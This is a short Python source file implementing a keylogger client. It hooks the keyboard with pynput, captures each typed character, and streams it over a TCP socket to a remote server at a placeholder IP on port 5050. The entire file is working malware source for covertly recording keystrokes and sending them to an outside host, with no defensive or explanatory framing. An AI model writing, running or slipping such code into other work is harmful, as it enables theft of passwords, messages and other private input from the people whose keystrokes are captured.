import socket
from pynput.keyboard import Listener
# write the client ip instead of (..)
SERVER_IP = '..'

PORT = 5050
FORMAT = 'utf-8'

def send_key(key):
    try:
        char = key.char
        client_socket.send(char.encode(FORMAT))
    except AttributeError:
        pass

def start_client():
    global client_socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, PORT))

    with Listener(on_press=send_key) as listener:
        listener.join()

if __name__ == '__main__':
    start_client()
